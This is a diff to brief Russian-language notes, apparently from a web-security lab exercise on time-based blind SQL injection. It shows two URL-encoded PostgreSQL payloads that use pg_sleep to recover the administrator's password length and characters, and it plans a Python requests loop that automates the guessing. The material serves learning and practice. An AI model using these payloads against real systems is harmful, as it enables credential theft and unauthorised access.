@@ -14,3 +14,10 @@
 Injection: 
 1) Длинна пароля: '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 2) Пароль: '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+- Ответы и запросы будем обрабатывать в requests. pip install requests
+- Используем try\exp и пишем простейший код.
+- Вариаций обработки и выявления иньекций много, но решено использовать просто ...timeout...
+- This is not good but, быстро и просто, так же можно отсекать ответы с помощью recv data, сделать сортировку по размеру и вуаля, это будет идеально.
+- Формируем get запрос, два цикла, в обоих массивы, с нужными strings? numbers? всё нижний ряд. 
+- 
